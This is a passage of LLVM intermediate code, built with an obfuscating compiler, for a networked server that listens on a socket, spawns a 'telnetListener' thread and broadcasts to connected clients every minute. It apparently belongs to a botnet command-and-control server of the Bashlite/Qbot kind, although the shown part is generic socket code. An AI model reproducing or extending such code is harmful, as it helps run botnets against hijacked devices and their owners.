  %72 = load volatile i32, i32* @listenFD, align 4
  %73 = call i32 @epoll_ctl(i32 %71, i32 1, i32 %72, %struct.epoll_event* %11) #7
  store i32 %73, i32* %8, align 4
  %74 = load i32, i32* %8, align 4
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %66
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:77:                                     ; preds = %66
  %78 = load i32, i32* %9, align 4
  %79 = add nsw i32 %78, 2
  %80 = zext i32 %79 to i64
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %14, align 8
  %82 = alloca i64, i64 %80, align 16
  br label %83

; <label>:83:                                     ; preds = %87, %77
  %84 = load i32, i32* %9, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %9, align 4
  %86 = icmp ne i32 %84, 0
  br i1 %86, label %87, label %93

; <label>:87:                                     ; preds = %83
  %88 = load i32, i32* %9, align 4
  %89 = add nsw i32 %88, 1
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i64, i64* %82, i64 %90
  %92 = call i32 @pthread_create(i64* %91, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #7
  br label %83

; <label>:93:                                     ; preds = %83
  %94 = getelementptr inbounds i64, i64* %82, i64 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = inttoptr i64 %96 to i8*
  %98 = call i32 @pthread_create(i64* %94, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %97) #7
  br label %99

; <label>:99:                                     ; preds = %100, %93
  br label %100

; <label>:100:                                    ; preds = %99
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i32 0, i32 0))
  %101 = call i32 @sleep(i32 60)
  br label %99
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

; <label>:18:                                     ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #7
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i32 0, i32 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:23:                                     ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

; <label>:25:                                     ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

; <label>:28:                                     ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #7
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %28
  br label %63

; <label>:42:                                     ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #7
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.110, i32 0, i32 0))
  br label %48

; <label>:48:                                     ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #7
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %48
  br label %67

; <label>:60:                                     ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

; <label>:63:                                     ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25

; <label>:67:                                     ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

; <label>:70:                                     ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:73:                                     ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #7
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

; <label>:76:                                     ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
